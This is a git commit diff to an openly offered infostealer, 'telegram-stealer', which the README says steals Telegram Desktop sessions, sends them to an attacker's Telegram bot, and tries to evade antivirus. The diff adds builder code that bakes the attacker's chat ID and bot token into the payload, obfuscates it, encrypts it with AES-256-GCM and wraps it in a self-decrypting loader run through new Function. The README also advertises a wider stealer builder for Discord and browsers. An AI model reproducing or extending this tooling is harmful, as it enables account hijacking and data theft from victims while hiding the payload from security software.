22d2f244a514f23e9fa40d9a78431ae8fe144cd2
rigwild <me@rigwild.dev>
2022-08-07 19:36:42 +0200

    Add aes-256-gcm encryption

--- README.md
+++ README.md
@@ -2,6 +2,8 @@
 
 Steal Telegram Desktop sessions.
 
+**Check [Waifu Stealer](https://github.com/rigwild/waifu-stealer) (Stealer builder: Discord, Telegram, Browsers, ...)**
+
 If the stealer is started inside WSL, it will get the Telegram Desktop sessions from its Windows host.
 
 **Note:** If the target configured a local password in Telegram Desktop, the sessions will be encrypted, so you would need the password to unlock it.
@@ -15,7 +17,7 @@ https://youtu.be/3mKOwtCnwYw
 - Steal Telegram Desktop sessions
 - Works on all platforms, including WSL (on WSL, the binary will get the sessions from its Windows host)
 - If Telegram Desktop is not in appData (i.e. portable installation), inspect the `Telegram.exe` running process to find its path (Windows or WSL only)
-- Source is highly obfuscated using [javascript-obfuscator](https://github.com/javascript-obfuscator/javascript-obfuscator)
+- Source is highly obfuscated using [javascript-obfuscator](https://github.com/javascript-obfuscator/javascript-obfuscator) and encrypted with `AES-256-GCM`
 - Output binary is packaged to a single portable binary using [pkg](https://github.com/vercel/pkg)
 - Send sessions via Telegram using webhooks
 - Try to detect some anti-virus virtual machines to be FUD as long as possible
@@ -57,9 +59,17 @@ npm install https://github.com/rigwild/telegram-stealer.git
 ```ts
 import { run as stealTelegram } from 'telegram-stealer'
 
-type StealTelegram = (telegramChatId: string, telegramToken: string, archivePassword?: string) => Promise<void>
+type StealTelegram = ({
+  telegramChatId: string,
+  telegramToken: string,
+  archivePassword?: string
+}) => Promise<void>
 
-await stealTelegram('<chat_id>', '<bot_token>', '<archivePassword>')
+await stealTelegram({
+  telegramChatId: '1234567890',
+  telegramToken: '12345678:EEExreg_CKLviTXNwTTfc-UdcStDOPfqFoMQ',
+  archivePassword: 'rigwild/telegram-stealer'
+})
 ```
 
 ## Related projects
--- builder.js
+++ builder.js
@@ -1,5 +1,7 @@
 const fs = require('fs')
 const path = require('path')
+const crypto = require('crypto')
+
 const JavaScriptObfuscator = require('javascript-obfuscator')
 
 const argv = process.argv.slice(2)
@@ -18,7 +20,6 @@ const libPath = path.join(__dirname, 'lib.js')
 const runnerPath = path.join(__dirname, 'runner.js')
 
 const outputDir = path.join(__dirname, 'obfuscated')
-const outputLibPath = path.join(outputDir, 'lib.js')
 const outputRunnerPath = path.join(outputDir, 'runner.js')
 
 let libCode = fs.readFileSync(libPath, 'utf8')
@@ -26,18 +27,9 @@ let runnerCode = fs.readFileSync(runnerPath, 'utf8')
 
 const chatId = argv[0]
 const token = argv[1]
+const archivePassword = argv[2] || ''
 
-// Replace data
-const replaced =
-  `let c = '${`${chatId.split('').reverse().join(',')}+${token.split('').reverse().join('~')}`
-    .split('')
-    .reverse()
-    .join('#')}';` +
-  `run(c.split('#').reverse().join('').split('+')[0].split(',').reverse().join(''), c.split('#').reverse().join('').split('+')[1].split('~').reverse().join('')`
-
-runnerCode = runnerCode.replace(/run\(\'.*?\', \'.*?\'/g, replaced)
-
-const options = {
+const obfuscationOptions = {
   compact: true,
   controlFlowFlattening: true,
   controlFlowFlatteningThreshold: 1,
@@ -66,7 +58,99 @@ const options = {
   unicodeEscapeSequence: true
 }
 
-fs.writeFileSync(outputLibPath, JavaScriptObfuscator.obfuscate(libCode, options).getObfuscatedCode(), 'utf8')
-fs.writeFileSync(outputRunnerPath, JavaScriptObfuscator.obfuscate(runnerCode, options).getObfuscatedCode(), 'utf8')
+/**
+ * Encrypts text by given key
+ * @param String text to encrypt
+ * @param Buffer masterkey
+ * @returns String encrypted text, base64 encoded
+ * @see https://gist.github.com/rigwild/a4f4cf1527bc044dbbc92f37f727484e
+ */
+function encrypt(text, masterkey) {
+  // random initialization vector
+  const iv = crypto.randomBytes(16)
+
+  // random salt
+  const salt = crypto.randomBytes(64)
+
+  // derive encryption key: 32 byte key length
+  // in assumption the masterkey is a cryptographic and NOT a password there is no need for
+  // a large number of iterations. It may can replaced by HKDF
+  // the value of 2145 is randomly chosen!
+  const key = crypto.pbkdf2Sync(masterkey, salt, 2145, 32, 'sha512')
+
+  // AES 256 GCM Mode
+  const cipher = crypto.createCipheriv('aes-256-gcm', key, iv)
+
+  // encrypt the given text
+  const encrypted = Buffer.concat([cipher.update(text, 'utf8'), cipher.final()])
+
+  // extract the auth tag
+  const tag = cipher.getAuthTag()
+
+  // generate output
+  return Buffer.concat([salt, iv, tag, encrypted]).toString('base64')
+}
+
+/**
+ * Decrypts text by given key
+ * @param String base64 encoded input data
+ * @param Buffer masterkey
+ * @returns String decrypted (original) text
+ * @see https://gist.github.com/rigwild/a4f4cf1527bc044dbbc92f37f727484e
+ */
+function decrypt(encdata, masterkey) {
+  // base64 decoding
+  const bData = Buffer.from(encdata, 'base64')
+
+  // convert data to buffers
+  const salt = bData.slice(0, 64)
+  const iv = bData.slice(64, 80)
+  const tag = bData.slice(80, 96)
+  const text = bData.slice(96)
+
+  // derive key using; 32 byte key length
+  const key = crypto.pbkdf2Sync(masterkey, salt, 2145, 32, 'sha512')
+
+  // AES 256 GCM Mode
+  const decipher = crypto.createDecipheriv('aes-256-gcm', key, iv)
+  decipher.setAuthTag(tag)
+
+  // encrypt the given text
+  const decrypted = decipher.update(text, 'binary', 'utf8') + decipher.final('utf8')
+
+  return decrypted
+}
+
+// Get a random encryption secret key
+const secret = [...Array(50)].map(() => Math.random().toString(36)[2]).join('')
+const key = crypto.createHash('sha256').update(String(secret)).digest('base64').substr(0, 32)
+
+runnerCode = runnerCode.replace(/telegramChatId.*/g, `telegramChatId: '${chatId}',`)
+runnerCode = runnerCode.replace(/telegramToken.*/g, `telegramToken: '${token}',`)
+runnerCode = runnerCode.replace(/archivePassword.*/g, `archivePassword: '${archivePassword}'`)
+// Replace require lib with lib code
+runnerCode = runnerCode.replace(/const \{ run \} = require\('\.\/lib'\)/g, libCode)
+runnerCode = runnerCode.replace(/module.exports = { run }/g, '')
+// console.log('Runner code (clear text):\n```')
+// console.log(runnerCode)
+// console.log('```')
+// Obfuscate internal code
+runnerCode = JavaScriptObfuscator.obfuscate(runnerCode, obfuscationOptions).getObfuscatedCode()
+
+const encrypted = encrypt(runnerCode, key)
+runnerCode = `
+const crypto = require('crypto')
+${decrypt.toString()}
+const decrypted = decrypt(\`${encrypted}\`, '${key}')
+new Function('require', decrypted)(require)
+`
+// Obfuscate loader decryption code
+runnerCode = JavaScriptObfuscator.obfuscate(runnerCode, obfuscationOptions).getObfuscatedCode()
+
+// console.log('#############\n\nRunner code encrypted:\n```')
+// console.log(runnerCode)
+// console.log('```')
+
+fs.writeFileSync(outputRunnerPath, runnerCode, 'utf8')
 
 console.log(`Obfuscated files saved to ${outputDir}`)
